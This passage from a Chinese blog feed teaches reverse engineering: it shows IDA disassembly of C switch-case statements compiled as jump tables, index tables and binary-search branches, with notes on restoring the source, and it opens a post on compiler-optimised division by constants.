class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 dec     eax</span><br><span class="line">.text:00401005                 cmp     eax, 5          ; switch 6 cases</span><br><span class="line">.text:00401008                 ja      short LBL_DEFAULT ; jumptable 0040100A default case</span><br><span class="line">.text:00401008</span><br><span class="line">.text:0040100A                 jmp     ds:aryJumpTable[eax*4] ; switch jump</span><br><span class="line">.text:0040100A</span><br><span class="line">.text:00401011</span><br><span class="line">.text:00401011 LBL_CASE1:                              ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401011                 push    offset s-&gt;Case1 ; jumptable 0040100A case 0</span><br><span class="line">.text:00401016                 call    printf</span><br><span class="line">.text:00401016</span><br><span class="line">.text:0040101B                 add     esp, 4</span><br><span class="line">.text:0040101E                 xor     eax, eax</span><br><span class="line">.text:00401020                 retn</span><br><span class="line">.text:00401020</span><br><span class="line">.text:00401021 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401021</span><br><span class="line">.text:00401021 LBL_CASE2:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401021                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401021                 push    offset s-&gt;Case2 ; jumptable 0040100A case 1</span><br><span class="line">.text:00401026                 call    printf</span><br><span class="line">.text:00401026</span><br><span class="line">.text:0040102B                 add     esp, 4</span><br><span class="line">.text:0040102E                 xor     eax, eax</span><br><span class="line">.text:00401030                 retn</span><br><span class="line">.text:00401030</span><br><span class="line">.text:00401031 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401031</span><br><span class="line">.text:00401031 LBL_CASE3:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401031                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401031                 push    offset s-&gt;Case3 ; jumptable 0040100A case 2</span><br><span class="line">.text:00401036                 call    printf</span><br><span class="line">.text:00401036</span><br><span class="line">.text:0040103B                 add     esp, 4</span><br><span class="line">.text:0040103E                 xor     eax, eax</span><br><span class="line">.text:00401040                 retn</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401041 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401041</span><br><span class="line">.text:00401041 LBL_CASE4:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401041                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401041                 push    offset s-&gt;Case4 ; jumptable 0040100A case 3</span><br><span class="line">.text:00401046                 call    printf</span><br><span class="line">.text:00401046</span><br><span class="line">.text:0040104B                 add     esp, 4</span><br><span class="line">.text:0040104E                 xor     eax, eax</span><br><span class="line">.text:00401050                 retn</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401051 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401051</span><br><span class="line">.text:00401051 LBL_CASE5:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401051                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401051                 push    offset s-&gt;Case5 ; jumptable 0040100A case 4</span><br><span class="line">.text:00401056                 call    printf</span><br><span class="line">.text:00401056</span><br><span class="line">.text:0040105B                 add     esp, 4</span><br><span class="line">.text:0040105E                 xor     eax, eax</span><br><span class="line">.text:00401060                 retn</span><br><span class="line">.text:00401060</span><br><span class="line">.text:00401061 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401061</span><br><span class="line">.text:00401061 LBL_CASE6:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401061                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401061                 push    offset s-&gt;Case6 ; jumptable 0040100A case 5</span><br><span class="line">.text:00401066                 call    printf</span><br><span class="line">.text:00401066</span><br><span class="line">.text:0040106B                 add     esp, 4</span><br><span class="line">.text:0040106E                 xor     eax, eax</span><br><span class="line">.text:00401070                 retn</span><br><span class="line">.text:00401070</span><br><span class="line">.text:00401071 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401071</span><br><span class="line">.text:00401071 LBL_DEFAULT:                            ; CODE XREF: _main+8j</span><br><span class="line">.text:00401071                 push    offset s-&gt;Default ; jumptable 0040100A default case</span><br><span class="line">.text:00401076                 call    printf</span><br><span class="line">.text:00401076</span><br><span class="line">.text:0040107B                 add     esp, 4</span><br><span class="line">.text:0040107E                 xor     eax, eax</span><br><span class="line">.text:00401080                 retn</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 _main           endp</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401081                 align 4</span><br><span class="line">.text:00401084 aryJumpTable    dd offset LBL_CASE1     ; DATA XREF: _main+Ar</span><br><span class="line">.text:00401084                 dd offset LBL_CASE2     ; jump table for switch statement</span><br><span class="line">.text:00401084                 dd offset LBL_CASE3</span><br><span class="line">.text:00401084                 dd offset LBL_CASE4</span><br><span class="line">.text:00401084                 dd offset LBL_CASE5</span><br><span class="line">.text:00401084                 dd offset LBL_CASE6</span><br><span class="line">.text:0040109C                 align 10h</span><br></pre></td></tr></table></figure><p>跳转表jumpTable是个指针数组，里面存放着各个CASE的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00401084 aryJumpTable    dd offset LBL_CASE1     ; DATA XREF: _main+Ar</span><br><span class="line">.text:00401084                 dd offset LBL_CASE2     ; jump table for switch statement</span><br><span class="line">.text:00401084                 dd offset LBL_CASE3</span><br><span class="line">.text:00401084                 dd offset LBL_CASE4</span><br><span class="line">.text:00401084                 dd offset LBL_CASE5</span><br><span class="line">.text:00401084                 dd offset LBL_CASE6</span><br></pre></td></tr></table></figure><p>在switch-case的入口处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 dec     eax</span><br><span class="line">.text:00401005                 cmp     eax, 5          ; switch 6 cases</span><br><span class="line">.text:00401008                 ja      short LBL_DEFAULT ; jumptable 0040100A default case</span><br><span class="line">.text:00401008</span><br><span class="line">.text:0040100A                 jmp     ds:aryJumpTable[eax*4] ; switch jump</span><br></pre></td></tr></table></figure><p>可以发现其为了利用跳转表的下标来进行寻址，需要将case值与数组下标相对应，因此<strong>需要减掉最小的那个case值</strong>。在本例中，也就是需要减掉最小的case值1，因此在入口处，首先将要测试的值减去1，然后与最大下标进行比较，如果大于，则说明是不在case范围内，直接跳转到default处进行处理即可，否则直接利用数组下标寻址公式来进行寻址到正确的case地址即可。</p><p>由于是使用的指针数组来进行寻址的，所以当case打乱的情况下，其填充进该数组中也是有序的，所以在生成跳转表的时候，跟你是否写的有序无关。</p><p>还原时，<strong>别忘了将case值加上最小的那个case值，才能得到真正的case值</strong>。</p><h1>优化方案3：索引表和跳转表组合方案</h1><p>适用于：case的数量大于3个，且case值相隔较大，且最大case值和最小case值之间的间隔不能超过255的情况。</p><p>实验代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 40&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">91</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 91&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">62</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 62&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">73</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 73&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 14&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 25&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;          </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于该实验代码，其在跳转表的基础上，又多了一张表，其大小为1个字节，即：可以表示的最大范围是0 - 255,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 add     eax, 0FFFFFFF2h</span><br><span class="line">.text:00401007                 cmp     eax, 4Dh        ; switch 78 cases</span><br><span class="line">.text:0040100A                 ja      short LBL_DEFAULT ; jumptable 00401014 default case</span><br><span class="line">.text:0040100A</span><br><span class="line">.text:0040100C                 xor     ecx, ecx</span><br><span class="line">.text:0040100E                 mov     cl, ds:indexTable[eax]</span><br><span class="line">.text:00401014                 jmp     ds:jumpTable[ecx*4] ; switch jump</span><br></pre></td></tr></table></figure><p>对应的两张表分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0040108C jumpTable       dd offset loc_40105B    ; DATA XREF: _main+14r</span><br><span class="line">.text:0040108C                 dd offset loc_40106B    ; jump table for switch statement</span><br><span class="line">.text:0040108C                 dd offset loc_40101B</span><br><span class="line">.text:0040108C                 dd offset loc_40103B</span><br><span class="line">.text:0040108C                 dd offset loc_40104B</span><br><span class="line">.text:0040108C                 dd offset loc_40102B</span><br><span class="line">.text:0040108C                 dd offset LBL_DEFAULT</span><br><span class="line"></span><br><span class="line">.text:004010A8 indexTable      db 0,6,6,6,6,6,6,6,6,6  ; DATA XREF: _main+Er</span><br><span class="line">.text:004010A8                 db 6,1,6,6,6,6,6,6,6,6  ; indirect table for switch statement</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,2,6,6,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,6,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,3,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,6,4</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,6,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,5</span><br></pre></td></tr></table></figure><p>可以发现，在索引表indexTable中，6代表的是跳转表的下标，即：<code>LBL_DEFAULT</code> 。因此在还原时，只<strong>需要先查索引表，然后加上最小的case值，即可还原</strong>。</p><h1>优化方案四：二叉排序树方案</h1><p>实验代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 40&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">91</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 91&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">62</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 62&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">296</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 73&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">289</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 14&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">257</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 257&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;          </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cmp     eax, 257</span><br><span class="line">.text:00401009                 jg      short LBL_NEXT_BRANCH</span><br><span class="line">.text:00401009</span><br><span class="line">.text:0040100B                 jz      short LBL_CASE257</span><br><span class="line">.text:0040100B</span><br><span class="line">.text:0040100D                 cmp     eax, 40</span><br><span class="line">.text:00401010                 jz      short LBL_CASE40</span><br><span class="line">.text:00401010</span><br><span class="line">.text:00401012                 cmp     eax, 62</span><br><span class="line">.text:00401015                 jz      short LBL_CASE62</span><br><span class="line">.text:00401015</span><br><span class="line">.text:00401017                 cmp     eax, 91</span><br><span class="line">.text:0040101A                 jnz     short LBL_DEFAULT</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101C                 push    offset s-&gt;Case91 ; &quot;case 91&quot;</span><br><span class="line">.text:00401021                 call    printf</span><br><span class="line">.text:00401021</span><br><span class="line">.text:00401026                 add     esp, 4</span><br><span class="line">.text:00401029                 xor     eax, eax</span><br><span class="line">.text:0040102B                 retn</span><br><span class="line">.text:0040102B</span><br><span class="line">.text:0040102C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040102C</span><br><span class="line">.text:0040102C LBL_CASE62:                             ; CODE XREF: _main+15j</span><br><span class="line">.text:0040102C                 push    offset s-&gt;Case62 ; &quot;case 62&quot;</span><br><span class="line">.text:00401031                 call    printf</span><br><span class="line">.text:00401031</span><br><span class="line">.text:00401036                 add     esp, 4</span><br><span class="line">.text:00401039                 xor     eax, eax</span><br><span class="line">.text:0040103B                 retn</span><br><span class="line">.text:0040103B</span><br><span class="line">.text:0040103C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040103C</span><br><span class="line">.text:0040103C LBL_CASE40:                             ; CODE XREF: _main+10j</span><br><span class="line">.text:0040103C                 push    offset s-&gt;Case40 ; &quot;case 40&quot;</span><br><span class="line">.text:00401041                 call    printf</span><br><span class="line">.text:00401041</span><br><span class="line">.text:00401046                 add     esp, 4</span><br><span class="line">.text:00401049                 xor     eax, eax</span><br><span class="line">.text:0040104B                 retn</span><br><span class="line">.text:0040104B</span><br><span class="line">.text:0040104C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040104C</span><br><span class="line">.text:0040104C LBL_CASE257:                            ; CODE XREF: _main+Bj</span><br><span class="line">.text:0040104C                 push    offset s-&gt;Case257 ; &quot;case 257&quot;</span><br><span class="line">.text:00401051                 call    printf</span><br><span class="line">.text:00401051</span><br><span class="line">.text:00401056                 add     esp, 4</span><br><span class="line">.text:00401059                 xor     eax, eax</span><br><span class="line">.text:0040105B                 retn</span><br><span class="line">.text:0040105B</span><br><span class="line">.text:0040105C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040105C</span><br><span class="line">.text:0040105C LBL_NEXT_BRANCH:                        ; CODE XREF: _main+9j</span><br><span class="line">.text:0040105C                 sub     eax, 289</span><br><span class="line">.text:00401061                 jz      short LBL_CASE289</span><br><span class="line">.text:00401061</span><br><span class="line">.text:00401063                 sub     eax, 7</span><br><span class="line">.text:00401066                 jz      short LBL_CASE73</span><br><span class="line">.text:00401066</span><br><span class="line">.text:00401068</span><br><span class="line">.text:00401068 LBL_DEFAULT:                            ; CODE XREF: _main+1Aj</span><br><span class="line">.text:00401068                 push    offset s-&gt;Default ; &quot;default&quot;</span><br><span class="line">.text:0040106D                 call    printf</span><br><span class="line">.text:0040106D</span><br><span class="line">.text:00401072                 add     esp, 4</span><br><span class="line">.text:00401075                 xor     eax, eax</span><br><span class="line">.text:00401077                 retn</span><br><span class="line">.text:00401077</span><br><span class="line">.text:00401078 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401078</span><br><span class="line">.text:00401078 LBL_CASE73:                              ; CODE XREF: _main+66j</span><br><span class="line">.text:00401078                 push    offset s-&gt;Case73 ; &quot;case 73&quot;</span><br><span class="line">.text:0040107D                 call    printf</span><br><span class="line">.text:0040107D</span><br><span class="line">.text:00401082                 add     esp, 4</span><br><span class="line">.text:00401085                 xor     eax, eax</span><br><span class="line">.text:00401087                 retn</span><br><span class="line">.text:00401087</span><br><span class="line">.text:00401088 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401088</span><br><span class="line">.text:00401088 LBL_CASE289:                            ; CODE XREF: _main+61j</span><br><span class="line">.text:00401088                 push    offset s-&gt;Case14 ; &quot;case 14&quot;</span><br><span class="line">.text:0040108D                 call    printf</span><br><span class="line">.text:0040108D</span><br><span class="line">.text:00401092                 add     esp, 4</span><br><span class="line">.text:00401095                 xor     eax, eax</span><br><span class="line">.text:00401097                 retn</span><br><span class="line">.text:00401097</span><br><span class="line">.text:00401097 _main           endp</span><br></pre></td></tr></table></figure><p>发现其使用的就是二叉排序树的形式来进行的，这样的话通过折半查找，几次之后就能得到最终要执行的那一个case分支，查找效率较大的提高。</p><p>该方案的代码定式就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmp</span><br><span class="line">jz</span><br><span class="line">jg</span><br><span class="line">; // 两轮判断下来，最后肯定执行的是小于的那一分支</span><br></pre></td></tr></table></figure><p>还原时就是抓住jz指令即可还原</p><h1>优化方案五：混合优化</h1><p>在实际应用中，几乎不会出现单一的优化形式，是上述4种方式的混合方案，不再赘述。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;大纲&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;case的数量小于等于3个，且case值连续&lt;/li&gt;
&lt;li&gt;case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7&lt;/li&gt;
&lt;li&gt;case的数量大于3个，且case值相隔较大，且最大ca</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="switch-case" scheme="https://4st.tech/tags/switch-case/"/>
    
    <category term="switch-case还原" scheme="https://4st.tech/tags/switch-case%E8%BF%98%E5%8E%9F/"/>
    
  </entry>
  
  <entry>
    <title>C++逆向：C/C++除法的非常规优化及其识别与还原</title>
    <link href="https://4st.tech/2021/08/04/c-c-chu-fa-de-fei-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/04/c-c-chu-fa-de-fei-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/</id>
    <published>2021-08-04T03:26:39.000Z</published>
    <updated>2021-09-01T05:12:23.690Z</updated>
    
    <content type="html"><![CDATA[<h1>大纲</h1><ul><li>无符号数除以非2的幂的特殊情况</li><li>有符号数除以非2的幂的两种特殊情况<ul><li>除数是正数，但是<code>MagicNum</code>为负</li><li>除数是负数，但是<code>MagicNum</code>为正</li></ul></li></ul><p>测试环境与编译选项均与上一篇常规情况相同。</p><h1>无符号数除以非2的幂的特殊情况</h1><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">7</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整理后对应的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 24924925h</span><br><span class="line">.text:00401009                 mul     ecx</span><br><span class="line">.text:0040100B                 sub     ecx, edx</span><br><span class="line">.text:0040100D                 shr     ecx, 1</span><br><span class="line">.text:0040100F                 add     ecx, edx</span><br><span class="line">.text:00401011                 shr     ecx, 2</span><br><span class="line">.text:00401014                 push    ecx</span><br><span class="line">.text:00401015                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101A                 call    printf</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101F                 add     esp, 8</span><br><span class="line">.text:00401022                 xor     eax, eax</span><br><span class="line">.text:00401024                 retn</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 _main           endp</span><br></pre></td></tr></table></figure><p>在常规优化中，其代码定式应该是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, MagicNum</span><br><span class="line">mul x</span><br><span class="line">shr edx, n</span><br></pre></td></tr></table></figure><p>而在上述代码中，操作却不一致，这是为什么？上述操作又是在做什么？可以根据上述代码写出数学表达式进行化简来得到其结果，设<code>ecx = arg0</code>， <code>C = 24924925h </code>，有：</p><p style=""><img 